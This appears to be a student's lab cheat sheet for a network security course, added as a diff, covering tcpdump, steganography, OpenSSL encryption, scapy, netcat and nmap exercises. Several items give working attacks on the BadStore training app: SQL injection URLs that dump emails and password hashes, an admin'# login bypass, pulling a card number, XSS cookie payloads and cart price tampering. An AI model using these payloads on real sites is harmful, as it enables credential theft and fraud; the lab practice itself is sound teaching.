@@ -1,0 +1,555 @@
+1a)
+- create 2 text files
+- zip them and name as lab1.zip
+- donwload jpg image
+- copy /B img.jpg + exp.zip imgnew.jpg
+- open imgnew.jpg in winrar, and extract
+- open /imgnew and view files
+
+
+1b)
+- tcpdump -i any
+- tcpdump -i enp0s3 -w file1.pcap
+- tcpdump -r file1.pcap
+- tcpdump -i any -w capture.pcap
+- tcpdump -i any tcp
+- tcpdump -i any icmp
+- tcpdump -i enp0s3 icmp and host 192.168.1.100 -w file1.pcap
+- tcpdump -i any port 80
+- tcpdump -i any port 443
+- tcpdump -n -i enp0s3 'tcp[tcpflags] & tcp-syn != 0'
+- tcpdump -n -i enp0s3 'tcp[tcpflags] & (tcp-syn | tcp-ack) != 0' 
+- tcpdump -nn -i enp0s3 -p -e 'host bnmit.org and port 80 and tcp[tcpflags] & (tcp-syn | tcp-ack) != 0'
+
+
+1c)
+- HTTP : http://example.com and apply HTTP filter
+- HTTPS : https://example.com and apply TCP filter, search for syn, syn ack, ack flags
+- DNS : Visit http site and apply dns filter
+- ICMP : Open another cmd and ping example.com
+
+=======================================================
+
+2a) hiding text in audio file
+- Open pain, write something, save as bmp image
+- open coagula light, open bmp image, go to sound > render without blue, save as wav file
+- open sonic visualizer, layer > add spectrogram > all channels mixed
+
+
+2b) lsb image steganogrpahy (code)
+from PIL import Image
+
+
+img = Image.open("your image page").convert("RGB")
+pixels = img.load()
+
+
+message = input("enter the message to be hidden")
+msg = message + "#"  
+
+
+bits = ''.join(format(ord(c), '08b') for c in msg)
+
+
+i = 0
+for y in range(img.height):
+    for x in range(img.width):
+        if i < len(bits):
+            r, g, b = pixels[x, y]
+            pixels[x, y] = ((r & ~1) | int(bits[i]), g, b)
+            i += 1
+
+
+img.save("stego.png")
+print("Message hidden!")
+
+
+
+
+img = Image.open("stego.png")
+pixels = img.load()
+
+
+bits = ""
+for y in range(img.height):
+    for x in range(img.width):
+        bits += str(pixels[x, y][0] & 1)
+
+
+msg = ""
+for i in range(0, len(bits), 8):
+    msg += chr(int(bits[i:i+8], 2))
+    if msg.endswith("#"):
+        break
+
+
+print("Hidden message:", msg[:-1])
+
+
+2c) rsa algorithm
+- openssl genrsa -out key.pri 2048
+- openssl rsa -in key.pri -out key.pub -pubout
+- openssl rsa -in key.pri -noout -text
+- cat key.pub
+- echo "hello" > message.txt
+- openssl rsautl -encrypt -inkey key.pub -pubin -in message.txt -out message.enc
+- openssl rsautl -decrypt -inkey key.pri -in message.enc -out message.dec
+- openssl rand -hex 32 > secret.key
+- openssl rsautl -encrypt -inkey key.pub -pubin -in secret.key -out secret.key.enc
+- openssl rsautl -decrypt -inkey key.pri -in secret.key.enc -out secret.key.dec
+
+
+==============================================================
+
+
+3a) working of ebc and cbc
+- openssl enc -aes-128-cbc -e -in plain.txt -out cipher1.bin -k 112233445566778899
+- openssl enc -aes-128-cbc -d -in cipher1.bin -out output.txt -k 112233445566778899
+
+
+- openssl enc -aes-128-ecb -e -in plain.txt -out cipher1.bin -k 112233445566778899
+- openssl enc -aes-128-ecb -d -in cipher1.bin -out output.txt -k 112233445566778899
+
+
+- openssl enc -aes-128-ecb -e -in pic_original.bmp -out pic_ecb.bmp -k 00112233445566778899aabbccddeeff
+- openssl enc -aes-128-cbc -e -in img.bmp -out cbc1.bmp -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+
+
+- head -c 54 img.bmp > header
+- tail -c +55 ecb1.bmp > body_ecb5
+- cat header body_ecb5 > newecb.bmp
+- eog newecb.bmp
+- cat header body_cbc5 > newcbc.bmp
+- eog newcbc.bmp
+
+
+
+
+
+
+3b) padding in aes
+- echo -n 12345 > f1.txt
+- openssl enc -aes-128-cbc -e -in plain.txt -out cipher.bin -k test123 # encrypt with padding
+- openssl enc -aes-128-cbc -d -in cipher.bin -out output.txt -k test123 # decrypt
+
+
+- xxd plain.txt
+- xxd cipher.bin
+
+
+- openssl enc -aes-128-cbc -e -in plain.txt -out cipher.bin -k test123 -nopad # disable padding
+- echo -n "1234567890ABCDEF" > plain16.txt
+- openssl enc -aes-128-cbc -e -in plain16.txt -out cipher16.bin -k test123 -nopad
+
+
+- openssl enc -aes-128-cbc -e -in f1.txt -out f1.bin -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+- openssl enc -aes-128-cbc -d -nopad -in f1.bin -out p1.txt -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+
+
+3c)
+- tcpdump -i any
+- tcpdump -i enp0s3 -w file1.pcap
+- tcpdump -r file1.pcap
+- tcpdump -i any -w capture.pcap
+- tcpdump -i any tcp
+- tcpdump -i any icmp
+- tcpdump -i enp0s3 icmp and host 192.168.1.100 -w file1.pcap
+- tcpdump -i any port 80
+- tcpdump -i any port 443
+- tcpdump -n -i enp0s3 'tcp[tcpflags] & tcp-syn != 0'
+- tcpdump -n -i enp0s3 'tcp[tcpflags] & (tcp-syn | tcp-ack) != 0' 
+- tcpdump -nn -i enp0s3 -p -e 'host bnmit.org and port 80 and tcp[tcpflags] & (tcp-syn | tcp-ack) != 0'
+
+
+==============================================================
+
+
+4a)
+- openssl version
+
+
+touch plain.txt
+gedit plain.txt
+cat plain.txt
+
+
+openssl enc -aes-128-cbc -e -in plain.txt -out cipher1.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+openssl enc -aes-128-cbc -e -in plain.txt -out cipher1.bin -K 0123456789abcdeffedcba9876543210 -iv 0102030405060708090a0b0c0d0e0f
+openssl enc -aes-128-cbc -d -in cipher1.bin -out output1.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+xxd cipher1.bin
+cat output1.txt
+
+
+openssl enc -aes-128-ecb -e -in plain.txt -out cipher2.bin -K 0123456789abcdeffedcba9876543210
+openssl enc -aes-128-ecb -d -in cipher2.bin -out output2.txt -K 0123456789abcdeffedcba9876543210
+xxd cipher2.bin
+cat output2.txt
+
+
+
+
+4b)
+- openssl enc -aes-128-ecb -e -in img.bmp -out ecb.bin -K 00112233445566778899aabbccddeeff
+- openssl enc -aes-128-cbc -e -in img.bmp -out cbc.bin K 00112233445566778899aabbccddeeff 
+-iv 0102030405060708090a0b0c0d0e0f
+
+
+- head -c 54 img.bmp > header
+- tail -c +55 ecb.bin > body_ecb
+- tail -c +55 cbc.bin > body_cbc
+- cat header body_ecb > ecb.bmp
+- cat header body_cbc > cbc.bmp
+
+
+- eog ecb.bmp
+- eog cbc.bmp
+
+
+4c)
+- openssl genrsa -out key.pri 2048
+- openssl rsa -in key.pri -out key.pub -pubout
+- openssl rsa -in key.pri -noout -text
+- cat key.pub
+- echo "hello" > message.txt
+- openssl rsautl -encrypt -inkey key.pub -pubin -in message.txt -out message.enc
+- openssl rsautl -decrypt -inkey key.pri -in message.enc -out message.dec
+- openssl rand -hex 32 > secret.key
+- openssl rsautl -encrypt -inkey key.pub -pubin -in secret.key -out secret.key.enc
+- openssl rsautl -decrypt -inkey key.pri -in secret.key.enc -out secret.key.dec
+
+
+====================================================
+
+
+aa)
+- Add any item to cart
+- Open DevTools -> Applications -> Cookies
+- CartID cookie, copy value
+- URL decode (replace %3A with :)
+- Fields are timestamp : item_index : price : item_id
+- Change 11.5 to 0.01
+
+
+5b)
+from scapy.all import * 
+packet=IP()/TCP() 
+e_pack=Ether()/packet 
+e_pack.show()
+
+
+5c)
+#!/bin/bash
+host="www.example.com" 
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+for (( port=start_port; port<=end_port; port++ ))
+do
+    echo "Scanning port $port..."
+    nc -zv -w1 "$host" "$port" 2>&1
+done
+
+
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""'
+save it as port_scan.sh
+chmod +x port_scan.sh //changing permission
+./port_scan.sh
+
+
+
+
+
+
+
+========================================================
+
+
+
+
+6a)
+- Get Joe's password via SQL injection
+- URL : http://192.168.56.101/cgi-bin/badstore.cgi?searchquery=xx'+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,123,123+from+userdb+LIMIT+10+--+&action=search&x=16&y=7
+- Get hash and md5 reverse the hash
+- Login as joe
+- http://192.168.56.101/cgi-bin/badstore.cgi?action=viewprevious
+
+
+6b)
+from scapy.all import * 
+packets=sniff(count=10) 
+packets.summary() 
+print(packets[0].show()) 
+print(packets[1].show())
+
+
+6c)
+- Terminal 1 : nc -lvp 1234
+- Terminal 2 : nc 127.0.0.1 1234
+Across systems - 
+- Terminal 1 : nc -lvp 1234
+- Terminal 2 : nc <ip-of-pc1> 1234
+
+
+===========================================================
+
+
+7a)
+from scapy.all import * 
+
+
+result,unanswered=traceroute(["www.example.com","www.google.com"],maxttl=20) 
+
+
+result.show()
+
+
+7b)
+- Terminal 1 : nc www.google.com 80
+- GET / HTTP/1.0
+- Host: www.google.com
+- HEAD / HTTP/1.0
+
+
+7c)
+nmap -sn 192.168.1.0/24
+
+
+========================================================
+
+
+8a)
+import scapy.all as scapy
+request = scapy.ARP()
+request.pdst = "192.168.1.1/28"
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+request_broadcast = broadcast / request
+clients = scapy.srp(request_broadcast, timeout=2)[0]
+for element in clients:
+    print(element[1].psrc + " - " + element[1].hwsrc)
+
+
+
+
+8b)
+- Open terminal : nc -l 8080
+- Open browser : localhost:8080
+- Terminal : 
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 6
+- Press Enter twice
+- Hello!
+- See output in browser
+
+
+8c)
+- nmap 192.168.1.100-200
+- nmap 192.168.1.0/24 (subnet)
+
+
+====================================================
+
+
+9a)
+- Add any item to cart
+- DevTools -> Application -> Storage -> Cookie
+- Look for the cart cookie name
+- <script>alert(document.cookie);</script>
+
+
+9b)
+#!/bin/bash
+host="www.example.com" 
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+for (( port=start_port; port<=end_port; port++ ))
+do
+    echo "Scanning port $port..."
+    nc -zv -w1 "$host" "$port" 2>&1
+done
+
+
+9c)
+- nmap 192.168.1.1
+- nmap -sV 192.168.1.1
+
+
+============================================================
+
+
+10a)
+- Add any item to cart
+- DevTools -> Application -> Storage -> Cookie
+- Look for the cart cookie name
+- <script>alert(document.cookie);</script>
+
+
+10b)
+- nmap -O 192.168.1.1
+- nmap -A 192.168.1.1
+
+
+10c)
+- Login as admin using admin'#
+- http://192.168.56.101/cgi-bin/badstore.cgi?action=admin
+- Select Add User
+- View Page Source
+- Search for Hidden
+- Should see password field
+
+
+
+
+
+
+
+===========================================================
+
+
+
+
+11a)
+from scapy.all import * 
+packet=IP(dst="8.8.8.8")/ICMP() 
+send(packet)
+
+
+11b)
+- (printf "HTTP/1.1 200 OK\r\nContent-Type: image/png\r\n\r\n"; cat ~/Desktop/cat.png) | nc -l 8080
+- localhost:8080
+
+
+11c)
+- URL : http://192.168.56.101/cgi-bin/badstore.cgi?searchquery=x%27+union+select+count(itemnum),count(itemnum),count(itemnum),count(itemnum)+from+itemdb+--+&action=search&x=11&y=9
+- Query : x' union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from itemdb
+
+
+===================================================================
+
+
+12a)
+from scapy.all import *
+target = "www.example.com"
+for port in range(20, 25):
+    packet = IP(dst=target) / TCP(dport=port, flags="S")
+    response = sr1(packet, timeout=1, verbose=0)
+    if response:
+        print("Port", port, "is open")
+
+
+12b)
+- nmap --script vuln 192.168.1.1
+- nmap -oN "D:\\output.txt" 192.168.1.1
+
+
+12c)
+- URL : http://192.168.56.101/cgi-bin/badstore.cgi?action=supplierlogin
+- Login as joe@supplier.com, password : iforgot
+- Only available action is Upload Price Lists
+
+
+========================================================
+
+
+13a)
+- (printf "HTTP/1.1 200 OK\r\nContent-Type: image/png\r\n\r\n"; cat ~/Desktop/cat.png) | nc -l 8080
+
+
+13b)
+- nmap 192.168.1.100-200
+- nmap 192.168.1.0/24 (subnet)
+
+
+13c)
+- http://<ip>/cgi-bin/badstore.cgi?action=login
+- joe@supplier.com' --
+- ALITER
+- In search bar : x' UNION SELECT null, email, passwd, null FROM userdb WHERE email='joe@supplier.com' --
+- Go to order history
+- Find cc number
+
+
+
+
+
+
+
+=============================================================
+
+
+
+
+14a)
+from scapy.all import *
+def callback(packet):
+    if packet.haslayer(ICMP):
+        print("ICMP Packet Detected")
+        packet.show()
+
+
+sniff(filter="icmp", prn=callback, count=10)
+
+
+14b)
+- nmap 192.168.1.1
+- nmap -sV 192.168.1.1
+
+
+14c)
+- Login with admin'#
+- URL : http://192.168.56.101/cgi-bin/badstore.cgi?action=admin
+- Show Current Users
+- @whole.biz
+
+
+=============================================================
+
+
+15a)
+import scapy.all as scapy
+request = scapy.ARP()
+request.pdst = "192.168.5.0/24"
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+request_broadcast = broadcast / request
+clients = scapy.srp(request_broadcast, timeout=1)[0]
+for element in clients:
+    print(element[1].psrc + " - " + element[1].hwsrc)
+
+
+15b)
+- nc -l -p 8080 < image.jpg
+- (printf "HTTP/1.1 200 OK\r\nContent-Type: image/png\r\n\r\n"; cat ~/Desktop/cat.png) | nc -l 8080
+
+
+15c)
+For SSOid - 
+- Inspect -> Storage -> Cookies
+- URL : http://192.168.56.101/cgi-bin/badstore.cgi?searchquery=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E+&action=search&x=0&y=0
+- Answer : SSOid=am9lQHN1cHBsaWVyLmNvbTo2MjA3MmQ5NWFjYjU4OGM3ZWU5ZDZmYTBjNmM4NTE1NTpKb2UgU3Vw%0AcGxpZXI6Uw%3D%3D%0A
+- base64 decode
+- <script>alert(document.cookie);</script>
+
+
+===================================================================
+
+
+16a)
+from scapy.all import * result,unanswered=traceroute(["www.example.com","www.google.com"],maxttl=20) 
+result.show()
+
+
+16b)
+- nc -l -p 8080 < image.jpg
+- (printf "HTTP/1.1 200 OK\r\nContent-Type: image/png\r\n\r\n"; cat ~/Desktop/cat.png) | nc -l 8080
+
+
+
+
+16c)
+- Add any item to cart
+- DevTools -> Application -> Storage -> Cookie
+- Look for the cart cookie name
+- <script>alert(document.cookie);</script>
+
+=================================================================
